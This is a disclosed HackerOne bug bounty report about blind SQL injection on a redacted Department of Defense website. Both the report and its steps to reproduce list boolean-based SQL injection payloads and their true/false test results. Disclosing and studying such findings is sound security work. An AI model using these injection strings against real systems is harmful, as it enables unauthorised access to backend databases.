---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1102591'
original_report_id: '1102591'
title: Blind SQL iNJECTION
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2021-02-13T07:40:02.024Z'
disclosed_at: '2021-06-03T16:32:38.792Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 18
tags:
- hackerone
- sql-injection
---

# Blind SQL iNJECTION

## Metadata

- HackerOne Report ID: 1102591
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2021-06-03T16:32:38.792Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi DoD Secuirty team ,
i found Blind SQL Injection in this below domain 
https://███████
Proof of concept:
Vuln URL:https://██████████/██████
Pooc:

URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='

Tests performed: 
-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
-1' OR 2=4 or '4mEwSPwJ'=' => FALSE
-1' OR 3*2<(1+2+4) or '4mEwSPwJ'=' => TRUE
-1' OR 3*2>(1+2+4) or '4mEwSPwJ'=' => FALSE
Poc video :
███

## Impact

It gives the attacker access and control over the backend database server

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
..Vuln URL:https://██████/█████
Pooc:

URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='

Tests performed: 
-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
-1' OR 2=4 or '4mEwSPwJ'=' => FALSE
-1' OR 3*2<(1+2+4) or '4mEwSPwJ'=' => TRUE
-1' OR 3*2>(1+2+4) or '4mEwSPwJ'=' => FALSE
Poc video :
█████

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
